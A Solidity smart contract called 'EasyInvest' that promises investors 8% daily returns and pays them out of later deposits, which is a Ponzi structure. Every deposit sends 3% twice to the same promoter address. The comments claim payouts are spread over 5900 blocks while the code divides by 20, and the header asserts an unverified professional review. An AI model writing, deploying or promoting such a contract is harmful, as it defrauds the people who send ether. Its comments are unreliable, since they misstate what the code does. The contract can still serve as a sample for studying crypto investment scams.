pragma solidity ^0.4.24;

/**
 *
 * Easy Investment Contract
 *  - GAIN 8% PER 24 HOURS (every 5900 blocks)
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 */
contract EasyInvest {
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;
    using SafeMath for uint256;
    address promoter1 = 0xcbc182f288fbb02e94cd616d1a88424cf4d11a2b;
    address promoter2 = 0xcbc182f288fbb02e94cd616d1a88424cf4d11a2b;
   
    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
    promoter1.transfer(msg.value.div(100).mul(3));
    promoter2.transfer(msg.value.div(100).mul(3));
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 8% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 8 / 100 * (block.number - atBlock[msg.sender]) / 20;

            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.send(amount);
            
        }

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
}
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}